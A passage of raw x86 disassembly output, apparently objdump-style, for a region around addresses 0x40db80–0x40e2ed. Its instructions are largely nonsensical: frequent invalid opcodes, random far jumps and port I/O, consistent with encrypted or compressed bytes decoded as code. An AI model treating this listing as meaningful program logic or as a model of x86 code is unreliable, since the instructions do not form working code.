  40db80:	or     DWORD PTR [esi],ebx
  40db82:	push   ss
  40db83:	push   edx
  40db84:	cmp    BYTE PTR [edi],0xf8
  40db87:	inc    ebp
  40db88:	and    DWORD PTR [ebx+0x743a7673],ebx
  40db8e:	jbe    0x40db7d
  40db90:	addr16 mov cl,0xb9
  40db93:	mul    DWORD PTR [eax]
  40db95:	sbb    bl,BYTE PTR [eax+0x7e]
  40db98:	xchg   BYTE PTR [ecx-0x1787b93a],dh
  40db9e:	mov    esi,0xa73b92de
  40dba3:	cli    
  40dba4:	dec    edx
  40dba5:	pop    edi
  40dba6:	push   esi
  40dba7:	(bad)  
  40dba8:	(bad)  
  40dba9:	cmp    ah,BYTE PTR [ecx]
  40dbab:	jl     0x40dbd1
  40dbad:	adc    dl,BYTE PTR [edx+ebx*1-0x33]
  40dbb1:	mov    al,ds:0xaa63b236
  40dbb6:	inc    edi
  40dbb7:	inc    edi
  40dbb8:	mov    eax,0xf5305749
  40dbbd:	cdq    
  40dbbe:	pop    esp
  40dbbf:	cld    
  40dbc0:	jge    0x40db81
  40dbc2:	push   es
  40dbc3:	dec    edi
  40dbc4:	push   0x76
  40dbc6:	add    ah,ch
  40dbc8:	jnp    0x40dbcd
  40dbca:	mov    dh,0x68
  40dbcc:	push   eax
  40dbcd:	aas    
  40dbce:	adc    ecx,0x61
  40dbd1:	dec    esp
  40dbd2:	jl     0x40db81
  40dbd4:	mov    cl,0x9b
  40dbd6:	ins    BYTE PTR es:[edi],dx
  40dbd7:	push   cs
  40dbd8:	(bad)  
  40dbda:	cmp    eax,0xbef5a290
  40dbdf:	jmp    0xd1d9325c
  40dbe4:	jmp    0x4c8fb980
  40dbe9:	lock jo 0x40db9c
  40dbec:	and    esi,DWORD PTR [edx]
  40dbee:	or     ecx,edx
  40dbf0:	pop    edi
  40dbf1:	push   ebp
  40dbf2:	pop    es
  40dbf3:	jmp    0x90b:0xf7671ff9
  40dbfa:	pop    esp
  40dbfb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dbfc:	xor    BYTE PTR [esi+0x48],bh
  40dbff:	stos   BYTE PTR es:[edi],al
  40dc00:	and    eax,0x3e28a3d5
  40dc05:	adc    eax,0x7015d4a1
  40dc0a:	shl    eax,cl
  40dc0c:	xor    dl,BYTE PTR [edi+0x330ce9f5]
  40dc12:	mov    eax,DWORD PTR ds:0xf6a947a
  40dc18:	push   0xdf70c93
  40dc1d:	in     al,dx
  40dc1e:	lods   al,BYTE PTR ds:[esi]
  40dc1f:	mov    bh,0x59
  40dc21:	jae    0x40dbd1
  40dc23:	xchg   eax,ecx
  40dc25:	stc    
  40dc26:	out    dx,al
  40dc27:	call   0x842785ee
  40dc2c:	jbe    0x40dbfd
  40dc2e:	imul   edx,DWORD PTR [ecx+0x38],0x16
  40dc32:	xchg   ecx,eax
  40dc33:	sbb    DWORD PTR [eax-0x6211d24f],ebx
  40dc39:	cs or  eax,0xb1516c55
  40dc3f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dc40:	sti    
  40dc41:	dec    ebx
  40dc42:	push   ecx
  40dc43:	push   edi
  40dc44:	in     al,0x1
  40dc46:	jae    0x40dc15
  40dc48:	xchg   esi,eax
  40dc49:	jo     0x40dbe3
  40dc4b:	xchg   BYTE PTR [ebx],bh
  40dc4d:	inc    ebp
  40dc4e:	ror    DWORD PTR [edx+0x46fae8f6],cl
  40dc54:	cld    
  40dc55:	inc    ecx
  40dc56:	jmp    0x757d:0x41a0e23e
  40dc5d:	mov    bl,0xe2
  40dc5f:	push   ebp
  40dc60:	mov    ds:0xe2e52464,eax
  40dc65:	mov    ch,0xf7
  40dc68:	mov    bl,0xfc
  40dc6a:	iret   
  40dc6b:	mov    WORD PTR [ebx],es
  40dc6d:	dec    ecx
  40dc6e:	cdq    
  40dc6f:	mov    ds:0xbf358be5,al
  40dc74:	out    0xb6,eax
  40dc76:	mov    ch,0x6a
  40dc78:	repz mov esp,0x79e2b1fa
  40dc7e:	(bad)  
  40dc80:	out    dx,al
  40dc81:	js     0x40dc39
  40dc83:	nop
  40dc84:	mov    bh,bh
  40dc86:	pop    eax
  40dc87:	xor    edx,DWORD PTR [eax-0x77]
  40dc8a:	mov    esi,DWORD PTR [esi-0x73]
  40dc8d:	lods   eax,DWORD PTR ds:[esi]
  40dc8e:	inc    esp
  40dc8f:	mov    esp,0xea9812f6
  40dc94:	xlat   BYTE PTR ds:[ebx]
  40dc95:	add    ecx,ebp
  40dc97:	add    edi,DWORD PTR [edx]
  40dc99:	mov    esi,0x7dc3c98f
  40dc9e:	daa    
  40dc9f:	add    ecx,edx
  40dca1:	ret    0x4d32
  40dca4:	jnp    0x40dd14
  40dca6:	mov    ecx,0xbf2106b7
  40dcab:	fmul   DWORD PTR [edx]
  40dcad:	test   al,0x9c
  40dcaf:	push   edi
  40dcb0:	sub    eax,0xba9a5ccb
  40dcb5:	and    al,0xe3
  40dcb7:	xchg   ecx,eax
  40dcb8:	out    0xaa,al
  40dcba:	push   esp
  40dcbb:	sbb    BYTE PTR [ebp-0x6a],ch
  40dcbe:	and    edx,eax
  40dcc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcc1:	pop    ecx
  40dcc2:	test   BYTE PTR [eax],cl
  40dcc4:	ret    
  40dcc5:	or     ecx,DWORD PTR [edx+0x2e]
  40dcc8:	xchg   DWORD PTR [ebx+0x71],eax
  40dccb:	in     al,dx
  40dccc:	or     DWORD PTR [eax-0x2f],edx
  40dccf:	xchg   edx,eax
  40dcd0:	xor    DWORD PTR [eax],edi
  40dcd2:	aad    0xb2
  40dcd4:	cmp    al,0xa4
  40dcd6:	jle    0x40dd2c
  40dcd8:	mov    ch,0x17
  40dcda:	aam    0x13
  40dcdc:	adc    bh,BYTE PTR [eax]
  40dcde:	(bad)  
  40dcdf:	xlat   BYTE PTR ds:[ebx]
  40dce0:	push   es
  40dce1:	pop    ss
  40dce2:	mov    BYTE PTR [eax],dh
  40dce4:	int    0xd9
  40dce6:	push   0x511949a1
  40dceb:	sub    eax,0x800d465a
  40dcf0:	xor    al,0x65
  40dcf2:	retf   0x7359
  40dcf5:	out    dx,al
  40dcf6:	jne    0x40dcd2
  40dcf8:	imul   edx,DWORD PTR [ecx],0x9b6b45b3
  40dcfe:	dec    esp
  40dcff:	fnsave [esi-0x21]
  40dd02:	test   al,0x7a
  40dd04:	je     0x40dd44
  40dd06:	into   
  40dd07:	bound  esp,QWORD PTR [eax]
  40dd09:	or     bl,BYTE PTR [ebp+0x26]
  40dd0c:	sahf   
  40dd0d:	mov    DWORD PTR ds:[ebp-0x70],ebp
  40dd11:	mov    ds:0x8f3482ba,al
  40dd16:	test   bl,dh
  40dd18:	int    0x61
  40dd1a:	(bad)  
  40dd1c:	adc    esp,DWORD PTR [edi-0x41]
  40dd1f:	mov    bh,0x45
  40dd21:	es nop
  40dd23:	gs jmp 0xf28e3fdc
  40dd29:	mov    ds:0xec129d24,al
  40dd2e:	dec    esi
  40dd2f:	add    al,0x5c
  40dd31:	adc    BYTE PTR [ebp-0x1e73b533],0xf3
  40dd38:	lea    ebp,[ebp+0x55]
  40dd3b:	imul   BYTE PTR [esi]
  40dd3d:	fwait
  40dd3e:	ins    BYTE PTR es:[edi],dx
  40dd3f:	in     al,0xbc
  40dd41:	in     eax,0x56
  40dd43:	out    dx,al
  40dd44:	test   DWORD PTR [ecx-0x4e4ba083],esp
  40dd4a:	fmul   QWORD PTR [ebx-0x40b932f1]
  40dd50:	leave  
  40dd51:	outs   dx,BYTE PTR ds:[esi]
  40dd52:	hlt    
  40dd53:	(bad)  
  40dd54:	aas    
  40dd55:	adc    ebx,DWORD PTR [edi]
  40dd57:	lock pop esp
  40dd59:	push   cs
  40dd5a:	jp     0x40dd03
  40dd5c:	fstp   DWORD PTR [edx-0x5]
  40dd5f:	push   0xe02b52fc
  40dd64:	jo     0x40dd33
  40dd66:	test   eax,0x238433ac
  40dd6b:	and    cl,BYTE PTR [eax]
  40dd6d:	push   ds
  40dd6e:	mov    ebx,0xf6a64bb1
  40dd73:	cwde   
  40dd74:	outs   dx,BYTE PTR ds:[esi]
  40dd75:	les    esi,FWORD PTR [eax+0x457712e6]
  40dd7b:	out    0x86,al
  40dd7d:	add    eax,0xca69cd3c
  40dd82:	pop    es
  40dd83:	or     al,0x19
  40dd85:	loopne 0x40dd95
  40dd87:	imul   edi,ecx,0xdd7c0042
  40dd8d:	or     BYTE PTR [edi-0x135a1de4],bl
  40dd93:	into   
  40dd94:	xchg   esi,eax
  40dd95:	sub    eax,0xffe0d205
  40dd9a:	push   esp
  40dd9b:	jae    0x40dddc
  40dd9d:	jno    0x40dd50
  40dd9f:	jns    0x40de16
  40dda1:	and    al,dh
  40dda3:	(bad)
  40dda6:	test   al,0x34
  40dda8:	fs call 0x55cc:0x152eb407
  40ddb0:	(bad)  
  40ddb1:	imul   ebx,DWORD PTR [edx],0xf544a23d
  40ddb7:	inc    edi
  40ddb8:	repnz les esp,FWORD PTR [ebx-0xc]
  40ddbc:	push   0xffffff9b
  40ddbe:	xor    al,0x2a
  40ddc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddc1:	sub    DWORD PTR [edi-0x6e],edx
  40ddc4:	scas   eax,DWORD PTR es:[edi]
  40ddc5:	pop    edx
  40ddc6:	adc    DWORD PTR [eax+eiz*2-0xd],0x5296e94b
  40ddce:	xchg   esi,eax
  40ddcf:	test   al,0xf
  40ddd1:	out    dx,al
  40ddd2:	mov    eax,0xa902094e
  40ddd7:	retfw  0x58e6
  40dddb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dddc:	rcr    DWORD PTR [ecx],1
  40ddde:	jmp    0xd3f88239
  40dde3:	jecxz  0x40dd95
  40dde5:	clc    
  40dde6:	js     0x40de1a
  40dde8:	fwait
  40dde9:	loopne 0x40ddbe
  40ddeb:	mov    eax,ds:0x2f6e4735
  40ddf0:	xlat   BYTE PTR ds:[ebx]
  40ddf1:	xchg   esi,eax
  40ddf2:	rol    ecx,1
  40ddf4:	cmp    al,0xf5
  40ddf6:	inc    esi
  40ddf7:	xchg   ebx,eax
  40ddf8:	fistp  QWORD PTR [ecx]
  40ddfa:	pop    edi
  40ddfb:	jecxz  0x40de74
  40ddfd:	out    dx,eax
  40ddfe:	popf   
  40ddff:	call   0x1e1e1586
  40de04:	fsub   QWORD PTR [edx-0x159ae82c]
  40de0a:	xchg   ebx,eax
  40de0b:	jo     0x40de3f
  40de0d:	nop
  40de0e:	jae    0x40ddc3
  40de10:	dec    ebp
  40de11:	push   edx
  40de12:	retf   
  40de13:	mov    esi,0xd76454d1
  40de18:	(bad)  
  40de1a:	loop   0x40de17
  40de1c:	jg     0x40de5e
  40de1e:	test   eax,0x3a355c4f
  40de23:	pop    ebp
  40de24:	mov    edi,0xa08334ac
  40de29:	outs   dx,DWORD PTR ds:[esi]
  40de2a:	jmp    0xa11b8604
  40de2f:	inc    edx
  40de30:	mov    bl,0xac
  40de32:	aam    0xae
  40de34:	je     0x40deac
  40de36:	mov    edx,0xccaf7e69
  40de3b:	add    ecx,DWORD PTR [edx+0x75]
  40de3e:	mov    al,0xd
  40de40:	out    dx,al
  40de41:	pop    ebp
  40de42:	stc    
  40de43:	push   ecx
  40de44:	xor    eax,0x9bcaaca7
  40de49:	sbb    al,0xb9
  40de4b:	fnstcw WORD PTR [ecx+0x7a]
  40de4e:	repz pop ss
  40de50:	jno    0x40de16
  40de52:	ds lock ins BYTE PTR es:[edi],dx
  40de55:	es cmp ebx,eax
  40de58:	mov    bl,0xca
  40de5a:	popf   
  40de5b:	dec    ecx
  40de5c:	inc    esi
  40de5d:	test   al,0x70
  40de5f:	fidivr WORD PTR [ecx]
  40de61:	pop    edi
  40de62:	push   es
  40de63:	pop    edx
  40de64:	sahf   
  40de65:	sub    edi,DWORD PTR ds:0x75f3a98
  40de6b:	sub    al,0x2d
  40de6d:	cmp    BYTE PTR [eax-0x5463fad4],0x1a
  40de74:	out    dx,eax
  40de75:	mov    ax,0x4f51
  40de79:	pop    ecx
  40de7a:	cmp    ebx,DWORD PTR [ecx+0x40c1de39]
  40de80:	es inc esi
  40de82:	jecxz  0x40dec2
  40de84:	push   DWORD PTR [edx-0x102b419f]
  40de8a:	sub    eax,0x9eafed0c
  40de8f:	fnsave [edi+0x65]
  40de92:	add    eax,0xd25293ce
  40de97:	arpl   WORD PTR [ebx+0x32],di
  40de9a:	jg     0x40de44
  40de9c:	fisub  WORD PTR [ecx-0x3e]
  40de9f:	sub    al,0x2e
  40dea1:	test   al,0xfd
  40dea3:	add    bh,0x1e
  40dea6:	xlat   BYTE PTR ds:[ebx]
  40dea7:	mov    dh,0xcf
  40dea9:	pop    ebp
  40deaa:	xor    dl,cl
  40deac:	ror    DWORD PTR [edx+ebx*1+0x8],cl
  40deb0:	ror    esi,cl
  40deb2:	pop    ds
  40deb3:	mov    WORD PTR [esi-0x47],ds
  40deb6:	pop    ebp
  40deb7:	pop    eax
  40deb8:	dec    ecx
  40deb9:	call   0x5b66:0x94f5b313
  40dec0:	ss and eax,0x3f0fb370
  40dec6:	in     al,0x8f
  40dec8:	outs   dx,DWORD PTR ds:[esi]
  40dec9:	push   esi
  40deca:	std    
  40decb:	push   esi
  40decc:	adc    ch,BYTE PTR [eax+0x55]
  40decf:	or     ebx,DWORD PTR [ecx+esi*8]
  40ded2:	mov    dh,0xe2
  40ded4:	imul   edx,DWORD PTR [ecx-0x6806b646],0xffffffd7
  40dedb:	cld    
  40dedc:	mov    dh,bl
  40dede:	xor    DWORD PTR [edi+0x64fff24c],ecx
  40dee4:	cld    
  40dee5:	pop    edi
  40dee6:	push   eax
  40dee7:	inc    esi
  40dee8:	fst    st(7)
  40deea:	sub    ebx,edx
  40deec:	sbb    eax,0xbb0bf25a
  40def1:	xor    BYTE PTR [ebx+0x5a7c0c1f],al
  40def7:	mov    ebp,0x5e1e4bd7
  40defc:	cld    
  40defd:	or     DWORD PTR [ecx-0x8d905e],ebp
  40df03:	ja     0x40df79
  40df05:	and    BYTE PTR [ebx-0x7d276861],ch
  40df0b:	adc    al,0x8d
  40df0d:	in     eax,0x3
  40df0f:	push   edi
  40df10:	in     eax,dx
  40df11:	lods   al,BYTE PTR ds:[esi]
  40df12:	pusha  
  40df13:	popf   
  40df14:	fwait
  40df15:	or     al,0x7c
  40df17:	aas    
  40df18:	add    dl,dl
  40df1a:	in     eax,dx
  40df1b:	push   0xd99462e1
  40df20:	jmp    0x8b8be5a3
  40df25:	test   eax,0x459dfdaf
  40df2a:	pop    ecx
  40df2b:	pop    eax
  40df2c:	inc    ebp
  40df2d:	and    al,0x3a
  40df2f:	or     BYTE PTR [edx+0x58],0xf2
  40df33:	mov    WORD PTR [ecx+0x9],gs
  40df36:	pop    ds
  40df37:	lods   eax,DWORD PTR ds:[esi]
  40df38:	cli    
  40df39:	xor    BYTE PTR [edx],cl
  40df3b:	mov    ebx,0xe2857b68
  40df40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df41:	inc    edx
  40df42:	arpl   bp,ax
  40df44:	cmp    al,0x43
  40df46:	inc    ebx
  40df47:	mov    gs,WORD PTR [esi]
  40df49:	xchg   DWORD PTR [esi+0x2eb0fb9f],ebp
  40df4f:	inc    eax
  40df50:	mov    edx,DWORD PTR [ebx+0x35]
  40df53:	jmp    FWORD PTR [edx-0x127cb8ac]
  40df59:	xchg   esp,eax
  40df5a:	shr    BYTE PTR [eax+0x33],cl
  40df5d:	mov    ebx,edx
  40df5f:	inc    esi
  40df60:	mov    ch,0xae
  40df62:	mov    ds:0x19da982f,eax
  40df67:	(bad)  
  40df68:	aam    0x1e
  40df6a:	xchg   esi,eax
  40df6b:	cmp    ebp,DWORD PTR [edx-0x28]
  40df6e:	cmc    
  40df6f:	xlat   BYTE PTR ds:[ebx]
  40df70:	jmp    0x40dfcd
  40df72:	mov    dh,0x1
  40df74:	cmp    DWORD PTR [edi],0x63646aea
  40df7a:	or     eax,0xe7ce7fdc
  40df7f:	sub    eax,edx
  40df81:	int    0xbc
  40df83:	in     al,dx
  40df84:	push   edi
  40df85:	dec    esi
  40df86:	retf   
  40df87:	je     0x40dfbd
  40df89:	jp     0x40dff1
  40df8b:	xlat   BYTE PTR ds:[ebx]
  40df8c:	dec    ebp
  40df8d:	les    eax,FWORD PTR [esi+eiz*1-0x29]
  40df91:	rcl    ah,0x14
  40df94:	jge    0x40dfaa
  40df96:	sbb    esi,edx
  40df98:	fsubr  st(7),st
  40df9a:	mov    edi,0xca77552c
  40df9f:	mov    cl,BYTE PTR [ecx-0x59]
  40dfa2:	scas   al,BYTE PTR es:[edi]
  40dfa3:	arpl   bp,dx
  40dfa5:	mov    ch,0x69
  40dfa7:	cmp    eax,0xe744e217
  40dfac:	aam    0x28
  40dfae:	std    
  40dfaf:	pushf  
  40dfb0:	cmp    al,0x21
  40dfb2:	xchg   eax,ebp
  40dfb4:	mov    eax,ds:0x1b5533f4
  40dfb9:	and    DWORD PTR [edx+0x6e830d21],ebx
  40dfbf:	aaa    
  40dfc0:	xchg   ebp,eax
  40dfc1:	lds    edi,FWORD PTR [eax]
  40dfc3:	push   es
  40dfc4:	rcr    al,1
  40dfc6:	mov    cl,0x10
  40dfc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfc9:	fwait
  40dfca:	mov    esi,0xc3e4ed71
  40dfcf:	loopne 0x40dfa3
  40dfd1:	cld    
  40dfd2:	fcomp  QWORD PTR [ebx]
  40dfd4:	mov    ah,0xae
  40dfd6:	or     BYTE PTR [ebx-0xb],al
  40dfd9:	inc    esi
  40dfda:	test   al,0xa9
  40dfdc:	sbb    al,0xdd
  40dfde:	cli    
  40dfdf:	scas   eax,DWORD PTR es:[edi]
  40dfe0:	or     ah,bh
  40dfe2:	daa    
  40dfe3:	xor    dh,BYTE PTR [esi]
  40dfe5:	cmp    ecx,DWORD PTR [esi-0x200d0d2a]
  40dfeb:	imul   edx,DWORD PTR [esp+ebp*1-0x4489dfa8],0x2a
  40dff3:	dec    ebp
  40dff4:	adc    bh,dl
  40dff6:	call   0x21207b20
  40dffb:	push   eax
  40dffc:	inc    ecx
  40dffd:	mov    cl,dl
  40dfff:	ins    DWORD PTR es:[edi],dx
  40e000:	mov    dl,0x7f
  40e002:	xor    DWORD PTR ds:0x66230604,0xffffff85
  40e009:	and    ebx,edx
  40e00b:	(bad)  
  40e00d:	dec    ebx
  40e00e:	add    ecx,DWORD PTR [edi+0x567b2e8a]
  40e014:	(bad)
  40e017:	addr16 inc esi
  40e019:	retf   0x5a38
  40e01c:	out    0xa7,eax
  40e01e:	add    ah,BYTE PTR [edi+edi*1]
  40e021:	in     al,dx
  40e022:	jbe    0x40e000
  40e024:	mov    esp,0xd35019f9
  40e029:	loope  0x40e0aa
  40e02b:	mov    al,ds:0x3b034626
  40e030:	fs add bl,cl
  40e033:	jnp    0x40dfbe
  40e035:	test   eax,0xe82b19b4
  40e03a:	push   0xffffff92
  40e03c:	call   0xc8e595f4
  40e041:	dec    ecx
  40e042:	cmp    BYTE PTR [esi-0x2dae4123],ch
  40e048:	je     0x40dfd8
  40e04a:	les    ecx,FWORD PTR [edx-0x4c68cd96]
  40e050:	xchg   ebx,eax
  40e051:	push   0x6c
  40e053:	xor    esp,DWORD PTR [eax]
  40e055:	call   DWORD PTR [edx+eiz*2-0x76]
  40e059:	loopne 0x40dff0
  40e05b:	loopne 0x40e0d6
  40e05d:	inc    esi
  40e05e:	popf   
  40e05f:	retf   0x16eb
  40e062:	and    BYTE PTR [eax],bl
  40e064:	mov    al,ds:0x9739780c
  40e069:	jmp    0xb0858d75
  40e06e:	lahf   
  40e06f:	fidivr WORD PTR [ecx-0x62]
  40e072:	mov    al,ds:0xcaceba6f
  40e077:	jge    0x40e0a5
  40e079:	push   edx
  40e07a:	mov    esi,0x9041a2e6
  40e07f:	fild   WORD PTR [esi+edx*8+0xe71b331]
  40e086:	pop    eax
  40e087:	inc    ebx
  40e088:	inc    esp
  40e089:	pop    esp
  40e08a:	(bad)
  40e08d:	mov    dh,0xd7
  40e08f:	addr16 jnp 0x40e0d8
  40e092:	pop    ebp
  40e093:	cmp    BYTE PTR [ecx-0x5a],ch
  40e096:	lahf   
  40e097:	sbb    eax,0xe9e81cf2
  40e09c:	adc    DWORD PTR [edi-0x28],0xa8083de0
  40e0a3:	sbb    bh,bl
  40e0a5:	jg     0x40e03e
  40e0a7:	call   0x4736b5c5
  40e0ac:	pop    ds
  40e0ad:	jne    0x40e07d
  40e0af:	mov    bl,0xbd
  40e0b1:	iret   
  40e0b2:	sub    cl,BYTE PTR [edi+eiz*4]
  40e0b5:	mov    ds:0xd1bcefd5,al
  40e0ba:	(bad)  
  40e0bb:	xlat   BYTE PTR ds:[ebx]
  40e0bc:	cmp    eax,0xa55e5876
  40e0c1:	int3   
  40e0c2:	(bad)  
  40e0c3:	out    0x66,al
  40e0c5:	pop    esp
  40e0c6:	daa    
  40e0c7:	sub    cl,BYTE PTR [ecx]
  40e0c9:	adc    dh,cl
  40e0cb:	push   cs
  40e0cc:	push   cs
  40e0cd:	cmp    eax,esp
  40e0cf:	lahf   
  40e0d0:	or     al,al
  40e0d2:	ret    
  40e0d3:	daa    
  40e0d4:	sti    
  40e0d5:	mov    bl,0xce
  40e0d7:	add    eax,DWORD PTR [eax]
  40e0d9:	outs   dx,DWORD PTR ds:[esi]
  40e0da:	or     BYTE PTR [ebp+0x10fa6c09],al
  40e0e0:	and    DWORD PTR [ebp-0x3047a7c0],0xffffffbc
  40e0e7:	pop    eax
  40e0e8:	mov    ch,0x34
  40e0ea:	sbb    BYTE PTR [edx],bl
  40e0ec:	mov    eax,0xa0c75c1b
  40e0f1:	out    0xcd,al
  40e0f3:	or     BYTE PTR [esi-0x73],cl
  40e0f6:	push   es
  40e0f7:	pop    ebp
  40e0f8:	imul   esi,DWORD PTR [ebx-0x7d5125db],0x5c
  40e0ff:	xor    BYTE PTR ds:0xff17c0ae,ah
  40e105:	leave  
  40e106:	pop    ds
  40e107:	adc    eax,0x4eea1945
  40e10c:	pop    ds
  40e10d:	outs   dx,BYTE PTR ds:[esi]
  40e10e:	mov    dh,0x2a
  40e110:	mov    ch,0xda
  40e112:	jge    0x40e0d3
  40e114:	loop   0x40e114
  40e116:	push   ebp
  40e117:	(bad)  
  40e118:	stos   BYTE PTR es:[edi],al
  40e119:	pop    edi
  40e11a:	lahf   
  40e11b:	sbb    DWORD PTR [esp+esi*1+0x3e],esp
  40e11f:	loop   0x40e13c
  40e121:	inc    edx
  40e122:	dec    ebp
  40e123:	stos   BYTE PTR es:[edi],al
  40e124:	mov    bl,0xd0
  40e126:	push   edi
  40e127:	pop    ebp
  40e128:	mov    esp,DWORD PTR [ecx]
  40e12a:	push   ds
  40e12b:	fimul  WORD PTR [edx]
  40e12d:	retf   0xbfb9
  40e130:	int3   
  40e131:	xor    bh,ah
  40e133:	loopne 0x40e123
  40e135:	and    al,0x9b
  40e137:	fisubr DWORD PTR [esi-0x4fa62b0f]
  40e13d:	add    BYTE PTR [esi+0x2efb75fb],dh
  40e143:	(bad)  
  40e144:	pop    esp
  40e145:	out    dx,eax
  40e146:	pop    edx
  40e147:	sahf   
  40e148:	add    DWORD PTR [ebx+edx*1-0x4428feee],edi
  40e14f:	cs mov ecx,0x542ed844
  40e155:	push   cs
  40e156:	mov    al,ds:0x813b27a4
  40e15b:	mov    eax,0xd36f5ab0
  40e160:	in     al,0x91
  40e162:	adc    esi,DWORD PTR [edx]
  40e164:	dec    edx
  40e165:	xor    dh,0x96
  40e168:	push   ebx
  40e169:	scas   al,BYTE PTR es:[edi]
  40e16a:	cwde   
  40e16b:	sbb    BYTE PTR [eax+ebp*4-0x6],cl
  40e16f:	std    
  40e170:	fidivr DWORD PTR [ebp-0x71]
  40e173:	add    eax,0x8a04e609
  40e178:	(bad)
  40e17d:	jns    0x40e109
  40e17f:	(bad)  
  40e180:	(bad)  
  40e181:	jmp    0x372f328e
  40e186:	cmp    DWORD PTR [ecx],0xffffffb9
  40e189:	daa    
  40e18a:	cmp    bl,BYTE PTR [ebp+0x19]
  40e18d:	pop    ss
  40e18e:	add    al,0xe2
  40e190:	inc    ebp
  40e191:	popa   
  40e192:	stos   BYTE PTR es:[edi],al
  40e193:	stos   DWORD PTR es:[edi],eax
  40e194:	cmp    eax,0x8b6e2edb
  40e199:	rcl    BYTE PTR [ecx],cl
  40e19b:	mov    ch,0xca
  40e19d:	jb     0x40e21b
  40e19f:	push   edx
  40e1a0:	sbb    DWORD PTR [ebx],0x664f4f1a
  40e1a6:	push   eax
  40e1a7:	fmul   QWORD PTR [edi-0x57]
  40e1aa:	stos   BYTE PTR es:[edi],al
  40e1ab:	loop   0x40e1f1
  40e1ad:	xchg   DWORD PTR [edx],ecx
  40e1af:	(bad)  
  40e1b0:	lock scas al,BYTE PTR es:[edi]
  40e1b2:	jb     0x40e145
  40e1b4:	das    
  40e1b5:	jbe    0x40e14c
  40e1b7:	xchg   ebp,eax
  40e1b8:	arpl   WORD PTR [edx-0x6f37c3d9],si
  40e1be:	fst    DWORD PTR [esi]
  40e1c0:	aad    0x2f
  40e1c2:	cmc    
  40e1c3:	jle    0x40e1c1
  40e1c5:	or     DWORD PTR [edx],eax
  40e1c7:	add    al,0x6e
  40e1c9:	xchg   cl,bl
  40e1cb:	mov    ds:0x90c842c4,eax
  40e1d0:	ja     0x40e1c6
  40e1d2:	push   esi
  40e1d3:	out    dx,al
  40e1d4:	mov    esp,0xdb7e17f9
  40e1d9:	std    
  40e1da:	dec    esp
  40e1db:	fmul   DWORD PTR [esi+edi*4-0x36720896]
  40e1e2:	mov    ecx,0x75a418b3
  40e1e7:	in     eax,dx
  40e1e8:	jae    0x40e242
  40e1ea:	in     al,0xac
  40e1ec:	iret   
  40e1ed:	outs   dx,BYTE PTR ds:[esi]
  40e1ee:	imul   eax,DWORD PTR [edi-0xae044f6],0x65
  40e1f5:	and    al,0x88
  40e1f7:	repnz int 0xd6
  40e1fa:	pusha  
  40e1fb:	enter  0xa967,0x12
  40e1ff:	mov    WORD PTR [eax+0x51214d24],gs
  40e205:	cmc    
  40e206:	test   eax,0x2b1e70a8
  40e20b:	test   al,0xe4
  40e20d:	repz imul ecx,esp,0x55999c2b
  40e214:	loop   0x40e22e
  40e216:	jno    0x40e1d0
  40e218:	es iret 
  40e21a:	sbb    bl,BYTE PTR [edx+0x26]
  40e21d:	xlat   BYTE PTR ds:[ebx]
  40e21e:	add    eax,0xdce06b83
  40e223:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e224:	mov    al,dh
  40e226:	jg     0x40e1ec
  40e228:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e229:	sub    eax,0xfceba63c
  40e22e:	and    DWORD PTR [edi-0x26d20c64],0xffffff8f
  40e235:	mov    ebp,0x707cbc5f
  40e23a:	push   esp
  40e23b:	aas    
  40e23c:	rcr    DWORD PTR [ecx-0x35],cl
  40e23f:	shl    BYTE PTR [edx-0xc],0xd
  40e243:	cwde   
  40e244:	(bad)  
  40e245:	repnz pop edx
  40e247:	inc    esp
  40e248:	and    DWORD PTR [ecx-0x59bc3669],edx
  40e24e:	cmp    eax,0x4318bb4d
  40e253:	pop    ecx
  40e254:	dec    ebp
  40e255:	xor    DWORD PTR [ebp-0x1c3c70e9],ebp
  40e25b:	or     esi,DWORD PTR [eax-0x72414963]
  40e261:	out    dx,eax
  40e262:	mov    esi,0xf1ce683e
  40e267:	xchg   edx,eax
  40e268:	cwde   
  40e269:	sub    BYTE PTR [edi+0x13],0x5b
  40e26d:	sub    bl,BYTE PTR [ebx-0x3d255193]
  40e273:	push   ecx
  40e274:	imul   edi,DWORD PTR [edx-0x3d166638],0x1d693916
  40e27e:	mov    BYTE PTR [eax],ah
  40e280:	pop    eax
  40e281:	repnz (bad) 
  40e283:	dec    edi
  40e284:	jmp    0xc08a:0xc9fb3480
  40e28b:	dec    ebx
  40e28c:	sbb    al,0xf4
  40e28e:	test   al,0x9b
  40e290:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e291:	imul   BYTE PTR [edx]
  40e293:	test   BYTE PTR [edi-0x61],bh
  40e296:	stos   BYTE PTR es:[edi],al
  40e297:	add    ebx,DWORD PTR ds:0x928686b4
  40e29d:	ja     0x40e236
  40e29f:	jecxz  0x40e26e
  40e2a1:	fs out dx,al
  40e2a3:	sar    BYTE PTR [edx-0x2e],1
  40e2a6:	jmp    0xff6b5b2c
  40e2ab:	dec    edx
  40e2ac:	mov    ecx,0xb7b734e1
  40e2b1:	lods   al,BYTE PTR ds:[esi]
  40e2b2:	(bad)  
  40e2b3:	mov    al,ds:0x8c072ab6
  40e2b8:	adc    esi,ecx
  40e2ba:	(bad)  [edx]
  40e2bc:	adc    DWORD PTR [esi-0x27],ecx
  40e2bf:	mov    BYTE PTR [esi+0x57],al
  40e2c2:	sbb    bl,BYTE PTR [esi+0x32]
  40e2c5:	mov    dh,0x5b
  40e2c7:	or     edx,edx
  40e2c9:	shr    BYTE PTR [ebx-0x568c7e1c],0x4a
  40e2d0:	cs dec esi
  40e2d2:	push   es
  40e2d3:	in     eax,0x3f
  40e2d5:	adc    cl,BYTE PTR [eax]
  40e2d7:	ja     0x40e25f
  40e2d9:	out    0x97,eax
  40e2db:	into   
  40e2dc:	mov    ch,0x11
  40e2de:	loope  0x40e2ef
  40e2e0:	fnstcw WORD PTR [ebx+0x50]
  40e2e3:	mov    ebp,0x73be770f
  40e2e8:	gs jae 0x40e27c
  40e2eb:	in     al,0xfd
  40e2ed:	call   0xfac8:0x66585c1d
